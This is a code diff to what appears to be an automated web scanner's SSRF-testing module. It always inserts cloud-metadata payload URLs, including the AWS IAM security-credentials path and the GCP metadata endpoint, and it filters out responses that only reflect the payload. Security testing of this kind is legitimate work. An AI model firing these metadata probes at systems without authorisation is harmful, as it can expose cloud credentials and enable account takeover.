@@ -56,6 +56,15 @@ SSRF_HEADERS = (
 async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET", form=None):
     findings: list[dict] = []
     payloads = ctx.payloads.for_category("ssrf", limit=18)
+    # guarantee the high-value cloud-metadata probes always run — evasion
+    # variant expansion shuffles the list and can crowd them out of the cap
+    for critical in (
+        "http://169.254.169.254/latest/meta-data/",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "http://metadata.google.internal/computeMetadata/v1/",
+    ):
+        if critical not in payloads:
+            payloads.insert(0, critical)
     sem = asyncio.Semaphore(int(ctx.config.get("concurrency", {}).get("scanner_workers", 8)))
 
     # candidate filter — score every param, keep those with hints, fall back
@@ -75,6 +84,12 @@ async def scan(ctx: "Context", url: str, params: list[str], method: str = "GET",
             async with sem:
                 ev = await _request(ctx, url, method, param, p, form)
             body = (ev.response_body or "").lower()
+            # an endpoint that merely ECHOES the injected URL would contain the
+            # indicator substrings inside the payload itself — that is a
+            # reflection, not a server-side fetch. Skip it.
+            if p.lower() in body:
+                ctx.memory.record_payload_result(p, "ssrf", False)
+                continue
             for label, marker in INDICATORS:
                 if marker.lower() in body and marker.lower() not in base_body:
                     findings.append(_finding(url, param, p, "in-band", ev,
